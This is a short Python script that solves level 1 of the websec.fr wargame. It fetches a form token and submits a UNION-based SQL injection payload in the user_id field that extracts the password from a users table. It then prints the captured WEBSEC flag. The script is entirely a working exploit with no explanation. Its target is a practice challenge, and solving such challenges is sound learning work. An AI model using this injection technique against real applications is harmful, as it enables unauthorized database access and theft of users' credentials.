from requests import *
import http.cookiejar
from bs4 import BeautifulSoup

url = 'http://websec.fr/level01/index.php'

res = post(url)
soup = BeautifulSoup(res.text, "html.parser")
token = soup.find("input", {"id": "token"}).get("value")

data = {
    'user_id' : '1 union select 1,password from users where id=1',
    'submit' : 'Submit',
    'token' : token
}

r = post(url , data=data , cookies=res.cookies)

pos = r.text.find("WEBSEC{")
while (True):
    txt = r.text[pos]
    print(txt, end='')
    if(txt == '}'):
        print()
        break
    pos += 1
